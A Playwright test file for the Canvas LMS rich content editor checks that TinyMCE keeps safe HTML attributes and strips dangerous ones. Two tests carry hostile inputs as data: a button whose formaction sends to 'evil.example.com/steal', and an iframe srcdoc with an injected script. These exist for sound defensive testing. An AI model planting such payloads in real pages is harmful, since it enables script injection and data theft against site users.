import {test, expect} from '../../fixtures/test'

// HTML attributes on elements must be handled selectively:
// - Safe attributes (href, alt, title, data-*, class, id on safe elements) should survive
// - Dangerous attributes (on*, srcdoc, formaction) must be stripped
// This tests canvas-rce's attribute whitelist, which is critical for Canvas LMS
// since course content often uses data-* attributes for LTI and media widgets.
test.describe('HTML attribute preservation', () => {
  test.beforeEach(async ({page, rcePage}) => {
    await page.goto('/scenarios/basic')
    await rcePage.waitForEditor()
  })

  async function setAndGet(page: any, html: string): Promise<string> {
    return page.evaluate((content: string) => {
      // @ts-expect-error -- TinyMCE global
      window.tinymce.activeEditor.setContent(content)
      // @ts-expect-error -- TinyMCE global
      return window.tinymce.activeEditor.getContent()
    }, html)
  }

  test('title attribute on links is preserved', async ({page}) => {
    const content = await setAndGet(
      page,
      '<a href="https://example.com" title="Visit example">link</a>',
    )
    expect(content).toContain('link')
    expect(content).toMatch(/href="https:\/\/example\.com"/)
    expect(content).toMatch(/title="Visit example"/)
  })

  test('alt attribute on images is preserved', async ({page}) => {
    const content = await setAndGet(
      page,
      '<img src="https://example.com/img.png" alt="A descriptive label" />',
    )
    // If img is kept, alt must be there
    if (content.includes('<img')) {
      expect(content).toMatch(/alt="A descriptive label"/)
    }
  })

  test('data-* attributes on safe elements may be preserved', async ({page}) => {
    const content = await setAndGet(page, '<span data-canvas-id="media-123">media embed</span>')
    expect(content).toContain('media embed')
    // data-* attributes: preserved or stripped depends on TinyMCE config
    // The important thing is the content text survives
  })

  test('class attribute on span is preserved', async ({page}) => {
    const content = await setAndGet(page, '<span class="math_equation_latex">x^2</span>')
    expect(content).toContain('x^2')
  })

  test('formaction attribute on button is stripped', async ({page}) => {
    const content = await setAndGet(
      page,
      '<button formaction="https://evil.example.com/steal">click</button>',
    )
    // Either button is removed entirely, or formaction is stripped
    if (content.includes('<button')) {
      expect(content).not.toContain('formaction')
    }
    expect(content).toContain('click')
  })

  test('srcdoc attribute (sandbox escape vector) is stripped or element removed', async ({
    page,
  }) => {
    const content = await setAndGet(page, '<iframe srcdoc="<script>alert(1)</script>"></iframe>')
    // Either iframe removed, or srcdoc stripped, or script stripped
    expect(content).not.toContain('srcdoc="<script>')
    expect(content).not.toContain('alert(1)')
  })

  test('target="_blank" on links is preserved', async ({page}) => {
    const content = await setAndGet(
      page,
      '<a href="https://example.com" target="_blank">external</a>',
    )
    expect(content).toContain('external')
    expect(content).toContain('target="_blank"')
  })
})
